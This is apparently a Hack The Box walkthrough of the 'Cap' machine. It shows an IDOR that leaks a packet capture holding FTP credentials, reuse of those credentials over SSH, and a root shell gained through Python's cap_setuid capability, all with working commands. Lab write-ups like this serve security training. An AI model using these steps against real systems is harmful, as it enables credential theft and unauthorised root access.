# Cap — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP** | `10.129.82.172` |

## Synopsis

Cap is an easy Linux machine hosting a network-monitoring dashboard that lets users
capture and download their own traffic as `.pcap` files. The download endpoint references
captures by a sequential numeric ID (`/data/<id>`), and because the ID is not tied to the
session, an **IDOR (Insecure Direct Object Reference)** lets you grab another user's
capture — `/data/0` — which contains a plaintext **FTP login** for the user `nathan`. Those
credentials are reused for SSH. On the box, the `/usr/bin/python3.8` binary carries the
`cap_setuid` Linux **capability**, which is abused to set UID 0 and spawn a root shell.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.82.172
nmap -p21,22,80 -sCV 10.129.82.172
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

### Web application

Port 80 serves a "Security Dashboard" (a Flask/gunicorn app). The sidebar exposes three
features:

- **Security Snapshot** (`/capture`) — runs a live packet capture and then redirects to a
  results page.
- **IP Config** (`/ip`) — output of `ifconfig`.
- **Network Status** (`/netstat`).

After a capture finishes, the browser lands on `/data/<id>` (e.g. `/data/1`) and offers a
**Download** button that serves the raw `.pcap`.

---

## Foothold

### IDOR on the capture ID

The capture ID in `/data/<id>` is sequential and **not bound to the current user or
session**. Manually requesting a lower ID returns someone else's capture:

```
http://10.129.82.172/data/0
```

Download the pcap for capture `0` and open it in Wireshark (or `tshark`):

```bash
wget http://10.129.82.172/download/0 -O 0.pcap
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

The capture contains a cleartext **FTP** session. Following the TCP stream reveals:

```
USER nathan
PASS <redacted-ftp-password>
```

### Credential reuse → SSH

The same credentials work over SSH:

```bash
ssh nathan@10.129.82.172
```

The **user flag** is in `/home/nathan/user.txt`.

---

## Privilege Escalation — Python `cap_setuid` capability

Enumerating Linux capabilities on the box:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` lets the binary change its UID without being SUID-root. Python can therefore
set its own UID to 0 and execute a shell:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

The **root flag** is at `/root/root.txt`.
